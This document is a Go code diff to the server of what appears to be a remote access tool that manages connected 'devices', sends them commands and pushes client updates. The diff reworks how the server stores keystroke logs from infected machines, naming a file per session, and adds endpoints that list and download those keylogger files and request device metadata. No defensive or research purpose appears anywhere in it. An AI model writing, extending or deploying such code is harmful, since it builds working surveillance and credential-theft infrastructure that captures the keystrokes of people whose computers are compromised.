@@ -12,6 +12,7 @@ import (
 	"github.com/gin-gonic/gin"
 	"net/http"
 	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
@@ -67,31 +68,45 @@ func OnDevicePack(data []byte, session *melody.Session) error {
 	var DeviceData *modules.Device
 
 	if pack.Act == `DEVICE_UP` {
-		// Check if this device has already connected.
-		// If so, then find the session and let client quit.
-		// This will keep only one connection remained per device.
-		exSession := ``
-		common.Devices.IterCb(func(uuid string, device *modules.Device) bool {
-			if device.ID == pack.Device.ID {
-				exSession = uuid
-				target, ok := common.Melody.GetSessionByUUID(uuid)
-				if ok {
-					common.SendPack(modules.Packet{Act: `OFFLINE`}, target)
-					target.Close()
-				}
-				return false
+		// Cancel any grace-period timer from a recent disconnect for this device.
+		// This suppresses the deferred CLIENT_OFFLINE event when the client
+		// reconnects faster than the TTL.
+		if pack.Device.ID != `` {
+			if cancel, ok := common.PendingDisconnects.Pop(pack.Device.ID); ok {
+				cancel()
 			}
-			return true
-		})
-		if len(exSession) > 0 {
-			common.Devices.Remove(exSession)
 		}
+
+		// Register the new session. Do this before evicting stale sessions so
+		// the device is always present in the map — no gap, no UI flicker.
 		common.Devices.Set(session.UUID, &pack.Device)
+
+		// Evict any other sessions that share the same device ID (e.g. a
+		// lingering session from before a quick reconnect).
+		if pack.Device.ID != `` {
+			var staleUUIDs []string
+			common.Devices.IterCb(func(existingUUID string, d *modules.Device) bool {
+				if d.ID == pack.Device.ID && existingUUID != session.UUID {
+					staleUUIDs = append(staleUUIDs, existingUUID)
+				}
+				return true
+			})
+			for _, staleUUID := range staleUUIDs {
+				// Remove the stale map entry first, then mark the session as
+				// superseded so wsOnDisconnect skips its grace-period logic.
+				common.Devices.Remove(staleUUID)
+				if s, ok := common.Melody.GetSessionByUUID(staleUUID); ok {
+					s.Set(`superseded`, true)
+					s.Close()
+				}
+			}
+		}
 		DeviceData = &pack.Device
 		common.Info(nil, `CLIENT_ONLINE`, ``, ``, map[string]any{
 			`device`: map[string]any{
 				`name`: pack.Device.Hostname,
 				`ip`:   pack.Device.WAN,
+				`id`:   pack.Device.ID,
 			},
 		})
 	} else {
@@ -107,16 +122,11 @@ func OnDevicePack(data []byte, session *melody.Session) error {
 	}
 	if len(pack.Device.KeyloggerData) > 0 {
 		keyloggerData := strings.Join(pack.Device.KeyloggerData, "")
-		filename := fmt.Sprintf("keylogger_%s_%s.log", DeviceData.ID, DeviceData.Hostname)
+		// filename includes session UUID so multiple agents on the same machine
+		// each get their own file, and no ambiguity arises on reconnect.
+		filename := fmt.Sprintf("keylogger_%s_%s_%s.log", DeviceData.ID, session.UUID, DeviceData.Hostname)
 
-		if _, err := os.Stat(filename); os.IsNotExist(err) {
-			if f, err := os.Create(filename); err != nil {
-				common.Warn(nil, "KEYLOGGER", "fail", "unable to create keylogger log file", map[string]any{"error": err.Error()})
-			} else {
-				f.Close()
-			}
-		}
-		f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY, 0644)
+		f, err := os.OpenFile(filename, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
 		if err != nil {
 			common.Warn(nil, "KEYLOGGER", "fail", "unable to open file", map[string]any{"error": err.Error()})
 		} else {
@@ -156,10 +166,12 @@ func CheckUpdate(ctx *gin.Context) {
 		})
 		return
 	}
-	tpl, err := os.Open(fmt.Sprintf(config.BuiltPath, form.OS, form.Arch))
+	builtPath := config.BuiltClientPath(form.OS, form.Arch)
+	tpl, err := os.Open(builtPath)
 	if err != nil {
 		ctx.AbortWithStatusJSON(http.StatusNotFound, modules.Packet{Code: 1, Msg: `${i18n|GENERATOR.NO_PREBUILT_FOUND}`})
 		common.Warn(ctx, `CLIENT_UPDATE`, `fail`, `no prebuild asset`, map[string]any{
+			`path`: builtPath,
 			`client`: map[string]any{
 				`os`:     form.OS,
 				`arch`:   form.Arch,
@@ -289,6 +301,46 @@ func ExecDeviceCmd(ctx *gin.Context) {
 	}
 }
 
+// GetUIConfig returns UI-relevant server configuration flags.
+func GetUIConfig(ctx *gin.Context) {
+	ctx.JSON(http.StatusOK, modules.Packet{Code: 0, Data: gin.H{
+		"noGenerate": config.Config.NoGenerate,
+	}})
+}
+
+// GetDeviceMetadata requests full metadata from a connected client and returns it.
+func GetDeviceMetadata(ctx *gin.Context) {
+	target, ok := CheckForm(ctx, nil)
+	if !ok {
+		return
+	}
+	// Pass the WAN IP we have on record so the client can include it without
+	// making an outbound HTTP request.
+	wan := ``
+	if device, ok := common.Devices.Get(target); ok {
+		wan = device.WAN
+	}
+	trigger := utils.GetStrUUID()
+	common.SendPackByUUID(modules.Packet{
+		Act:   `CLIENT_INFO`,
+		Event: trigger,
+		Data:  gin.H{`wan`: wan},
+	}, target)
+	ok = common.AddEventOnce(func(p modules.Packet, _ *melody.Session) {
+		if p.Code != 0 {
+			common.Warn(ctx, `CLIENT_INFO`, `fail`, p.Msg, nil)
+			ctx.AbortWithStatusJSON(http.StatusInternalServerError, modules.Packet{Code: 1, Msg: p.Msg})
+		} else {
+			common.Info(ctx, `CLIENT_INFO`, `success`, ``, nil)
+			ctx.JSON(http.StatusOK, modules.Packet{Code: 0, Data: p.Data})
+		}
+	}, target, trigger, 10*time.Second)
+	if !ok {
+		common.Warn(ctx, `CLIENT_INFO`, `fail`, `timeout`, nil)
+		ctx.AbortWithStatusJSON(http.StatusGatewayTimeout, modules.Packet{Code: 1, Msg: `${i18n|COMMON.RESPONSE_TIMEOUT}`})
+	}
+}
+
 // GetDevices will return all info about all clients.
 func GetDevices(ctx *gin.Context) {
 	devices := map[string]any{}
@@ -404,23 +456,110 @@ func WSHealthCheck(container *melody.Melody, sender Sender) {
 	}
 }
 
-// GetKeylog reads the local keylogger file based on the provided device UUID and returns its content.
+// keylogPattern returns the glob pattern that matches all keylog files for a device.
+// Files are named: keylogger_<deviceID>_<sessionUUID>_<hostname>.log
+func keylogPattern(deviceID string) string {
+	return fmt.Sprintf("keylogger_%s_*.log", deviceID)
+}
+
+// keylogFileForSession returns the exact filename for the given session UUID.
+func keylogFileForSession(deviceID, sessionUUID, hostname string) string {
+	return fmt.Sprintf("keylogger_%s_%s_%s.log", deviceID, sessionUUID, hostname)
+}
+
+// GetKeylog reads the keylog file for the connected session and returns its content.
 func GetKeylog(ctx *gin.Context) {
 	target, ok := CheckForm(ctx, nil)
 	if !ok {
 		return
 	}
-
 	device, ok := common.Devices.Get(target)
 	if !ok {
 		ctx.AbortWithStatusJSON(http.StatusNotFound, modules.Packet{Code: 1, Msg: "Device not found"})
 		return
 	}
-	filename := fmt.Sprintf("keylogger_%s_%s.log", device.ID, device.Hostname)
+	filename := keylogFileForSession(device.ID, target, device.Hostname)
 	data, err := os.ReadFile(filename)
 	if err != nil {
-		ctx.AbortWithStatusJSON(http.StatusNotFound, modules.Packet{Code: 1, Msg: err.Error()})
+		// Return empty rather than 404 when file doesn't exist yet.
+		if os.IsNotExist(err) {
+			ctx.JSON(http.StatusOK, modules.Packet{Code: 0, Data: map[string]any{"log": ""}})
+			return
+		}
+		ctx.AbortWithStatusJSON(http.StatusInternalServerError, modules.Packet{Code: 1, Msg: err.Error()})
 		return
 	}
 	ctx.JSON(http.StatusOK, modules.Packet{Code: 0, Data: map[string]any{"log": string(data)}})
+}
+
+// ListKeylogFiles returns metadata for all keylog files that belong to any
+// session of the given device (matched by device ID prefix).
+func ListKeylogFiles(ctx *gin.Context) {
+	target, ok := CheckForm(ctx, nil)
+	if !ok {
+		return
+	}
+	device, ok := common.Devices.Get(target)
+	if !ok {
+		ctx.AbortWithStatusJSON(http.StatusNotFound, modules.Packet{Code: 1, Msg: "Device not found"})
+		return
+	}
+	matches, err := filepath.Glob(keylogPattern(device.ID))
+	if err != nil {
+		ctx.AbortWithStatusJSON(http.StatusInternalServerError, modules.Packet{Code: 1, Msg: err.Error()})
+		return
+	}
+	type fileInfo struct {
+		Name      string `json:"name"`
+		Size      int64  `json:"size"`
+		SessionID string `json:"session_id"`
+		Current   bool   `json:"current"`
+	}
+	files := make([]fileInfo, 0, len(matches))
+	for _, path := range matches {
+		fi, err := os.Stat(path)
+		if err != nil {
+			continue
+		}
+		// Extract session UUID from filename: keylogger_<id>_<uuid>_<host>.log
+		base := filepath.Base(path)
+		// strip "keylogger_<id>_" prefix and ".log" suffix, then first segment is UUID
+		prefix := fmt.Sprintf("keylogger_%s_", device.ID)
+		sessionUUID := ""
+		if len(base) > len(prefix) {
+			rest := base[len(prefix) : len(base)-4] // strip prefix and ".log"
+			// UUID is 36 chars; it comes before the next underscore-hostname
+			if len(rest) >= 36 {
+				sessionUUID = rest[:36]
+			}
+		}
+		files = append(files, fileInfo{
+			Name:      base,
+			Size:      fi.Size(),
+			SessionID: sessionUUID,
+			Current:   sessionUUID == target,
+		})
+	}
+	ctx.JSON(http.StatusOK, modules.Packet{Code: 0, Data: map[string]any{"files": files}})
+}
+
+// DownloadKeylogFile serves a raw keylog file for download.
+// The filename is passed as a query param and validated to prevent path traversal.
+func DownloadKeylogFile(ctx *gin.Context) {
+	filename := ctx.Query("file")
+	if filename == "" {
+		ctx.AbortWithStatusJSON(http.StatusBadRequest, modules.Packet{Code: -1, Msg: "missing file param"})
+		return
+	}
+	// Safety: only allow plain filenames with no directory separators.
+	if filepath.Base(filename) != filename || strings.Contains(filename, "..") {
+		ctx.AbortWithStatusJSON(http.StatusBadRequest, modules.Packet{Code: -1, Msg: "invalid filename"})
+		return
+	}
+	// Must match the keylogger_ prefix pattern.
+	if !strings.HasPrefix(filename, "keylogger_") || !strings.HasSuffix(filename, ".log") {
+		ctx.AbortWithStatusJSON(http.StatusBadRequest, modules.Packet{Code: -1, Msg: "invalid filename"})
+		return
+	}
+	ctx.FileAttachment(filename, filename)
 }
